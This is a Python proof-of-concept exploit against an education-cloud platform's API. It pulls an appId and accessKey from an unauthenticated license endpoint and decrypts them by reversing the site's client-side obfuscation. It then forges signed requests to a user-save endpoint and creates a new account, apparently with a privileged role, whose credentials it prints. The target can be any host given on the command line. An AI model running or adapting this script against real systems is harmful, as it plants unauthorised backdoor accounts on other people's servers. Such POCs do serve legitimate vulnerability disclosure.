import requests
import argparse
import base64
import time
import random
import hashlib
import json
import urllib3

# 禁用安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class ZnyxAutomator:
    def __init__(self, base_url="https://znyx.zonekey.com.cn"):
        self.base_url = base_url
        self.session = requests.Session()
        self.app_id = ""
        self.access_key = ""
        self.timestamp = ""
        self.real_code = ""  # 从 site/list 获取的真正业务 code
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Referer": f"{self.base_url}/edu_cloud/base/main/homeGeneral?siteIdentify=30",
            "Origin": self.base_url,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
        }

    # --- 加解密工具 ---
    def _b64_encode(self, s: str) -> str:
        return base64.b64encode(s.encode()).decode().rstrip('=')

    def _b64_decode(self, s: str) -> str:
        if not s: return ""
        s = s.strip()
        missing_padding = len(s) % 4
        if missing_padding: s += '=' * (4 - missing_padding)
        return base64.b64decode(s).decode('utf-8', errors='ignore')

    def _encrypt(self, data_str: str) -> str:
        """对应 JS 逻辑：B64(Salt32 + Reverse(B64(input)) + Salt32)"""
        t = self._b64_encode(data_str)[::-1]
        now = time.time() * 1000
        prefix = hashlib.md5(str(now).encode()).hexdigest()
        suffix = hashlib.md5(str(now + random.random()).encode()).hexdigest()
        return self._b64_encode(prefix + t + suffix)

    def _decrypt_field(self, cipher: str) -> str:
        """通用的解密逻辑"""
        try:
            s = self._b64_decode(cipher)
            # 剥离首尾32位盐值并反转内容
            return self._b64_decode(s[32:-32][::-1])
        except:
            return ""

    # --- 业务逻辑 ---

    def fetch_auth_info(self):
        """步骤1: 获取基础 appId 和 accessKey"""
        path = "/platform/systems/authorize/api/license/read"
        url = f"{self.base_url.rstrip('/')}{path}"
        params = {"t": int(time.time() * 1000)}

        print(f"[*] 步骤1: 正在获取授权信息...")
        res = self.session.get(url, params=params, headers=self.headers, verify=False)
        data = res.json().get("map", {})

        self.app_id = self._decrypt_field(data.get("appId"))
        self.access_key = self._decrypt_field(data.get("accessKey"))
        self.timestamp = str(data.get("timestamp"))
        print(f"[+] 授权解析成功: appId={self.app_id}")

    def fetch_site_code(self):
        """步骤2: 获取 site 列表并提取业务 code"""
        if not self.app_id: self.fetch_auth_info()

        path = "/platform/systems/site/api/list"
        url = f"{self.base_url.rstrip('/')}{path}"
        params = {"t": int(time.time() * 1000)}

        # 生成签名
        sign = self._encrypt(f"{self.app_id}-{self.access_key}-{self.timestamp}")
        headers = self.headers.copy()
        headers["Sign"] = sign

        print(f"[*] 步骤2: 正在请求 site 列表获取业务 code...")
        res = self.session.get(url, params=params, headers=headers, verify=False)

        # site 接口返回的是一个巨大的加密字符串，直接对 response.text 进行解密
        raw_data = self._decrypt_field(res.text)
        if raw_data:
            json_data = json.loads(raw_data)
            sites = json_data.get("data", [])
            if sites:
                self.real_code = sites[0].get("code")
                print(f"[+] 业务 code 获取成功: {self.real_code}")
                return self.real_code
        print("[!] 业务 code 获取失败")
        return None

    def save_user(self):
        """步骤3: 使用获取到的 real_code 进行保存"""
        if not self.real_code:
            if not self.fetch_site_code(): return

        path = "/platform/systems/rights/user/api/save"
        url = f"{self.base_url.rstrip('/')}{path}"

        # 重新生成最新签名的 Sign
        sign = self._encrypt(f"{self.app_id}-{self.access_key}-{self.timestamp}")

        # 角色 ID 加密逻辑: 业务 code + "2"
        role_id_encrypted = self._encrypt(self.real_code + "2")

        payload = {
            "code": self.real_code,
            "passWord":"5aedbf70787ca09df3335d5093ca9e3c",
            "loginName": "testaaab",
            "name": "jysrc",
            "sex": "0",
            "roles": [{"id": role_id_encrypted}],
            "age": "",
            "classId": ""
        }

        headers = self.headers.copy()
        headers["Sign"] = sign

        print(f"[*] 步骤3: 正在提交保存请求...")
        response = self.session.post(url, headers=headers, json=payload, verify=False)

        print("-" * 50)
        print(f"状态码: {response.status_code}")
        print(f"返回结果: {response.text}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ZnyxAutomator POC")
    parser.add_argument(
        "-u",
        "--url",
        required=True,
        help="目标 base_url，例如 https://example.com",
    )
    args = parser.parse_args()

    client = ZnyxAutomator(base_url=args.url)
    client.save_user()
    print("username:testaaab;password=abc123..")
